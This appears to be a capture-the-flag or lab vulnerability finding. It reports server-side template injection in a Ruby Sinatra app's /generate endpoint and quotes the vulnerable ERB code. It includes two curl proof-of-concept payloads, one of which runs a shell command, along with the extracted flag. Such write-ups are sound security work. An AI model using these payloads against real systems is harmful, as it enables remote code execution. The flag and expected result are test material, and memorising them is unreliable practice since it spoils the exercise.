findings.title: ERB Server-Side Template Injection (SSTI) leading to RCE
findings.description: The Ruby Sinatra application passes user input directly to ERB.new() without sanitization in the /generate POST endpoint. The sentence parameter is used as the ERB template string, allowing arbitrary Ruby code execution via <%= %> syntax. Client-side JavaScript validation (regex /^[a-zA-Z0-9\s]+$/) is trivially bypassed by sending requests directly to the server.
findings.evidence:
Flag extracted: flag{c4ddca47-533e-432a-b5fa-1503c21c538c}

Vulnerable code in app.rb:
  template = ERB.new("#{sentence}")
  template.result(binding)

PoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%=7*7%>' --data-urlencode 'number=1' returns 49

PoC: curl -X POST http://172.17.0.1:46509/generate --data-urlencode 'sentence=<%= `ls /` %>' --data-urlencode 'number=1' returns directory listing

reproduction.expected: Flag content returned in response body
